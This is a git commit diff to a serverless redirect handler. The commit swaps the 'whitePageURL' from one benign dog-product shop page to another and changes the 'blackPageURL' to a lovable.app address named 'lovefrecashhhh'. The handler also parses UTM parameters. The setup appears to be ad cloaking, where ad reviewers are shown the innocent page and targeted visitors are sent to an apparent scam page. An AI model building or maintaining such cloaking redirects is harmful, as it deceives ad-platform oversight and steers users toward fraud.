261a6c5184205a0a112fb5228d9ce06d01b2515e
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-11-02 01:52:26 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/nobleza-hundematte-wasserdichte-hundedecke-flauschig-und-weich-outdoor-hundedecke-S00DI0LC/";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.sigikid-usa.com/collections/only-natures-materials/products/organic-dog-plush-toy";
+    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
